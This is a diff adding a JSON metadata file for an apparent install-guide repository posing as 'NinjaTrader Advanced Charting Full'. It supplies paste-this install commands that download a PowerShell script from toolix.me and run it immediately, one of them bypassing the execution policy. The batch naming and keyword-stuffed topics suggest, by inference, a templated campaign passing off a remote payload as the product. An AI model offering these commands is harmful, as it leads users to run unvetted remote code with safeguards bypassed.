@@ -1,0 +1,27 @@
+{
+  "repo": "NinjaTrader-Advanced-Charting-Full",
+  "product": "NinjaTrader Advanced Charting",
+  "product_title": "NinjaTrader Advanced Charting",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-ninjatrader-advanced-charting",
+    "ninjatrader-advanced-charting-app",
+    "coding-workflow",
+    "terminal-client",
+    "database-tools",
+    "developer-tools",
+    "ninjatrader-advanced-charting-windows-tool",
+    "ninjatrader-advanced-charting-modeling-tool",
+    "ninjatrader-advanced-charting",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
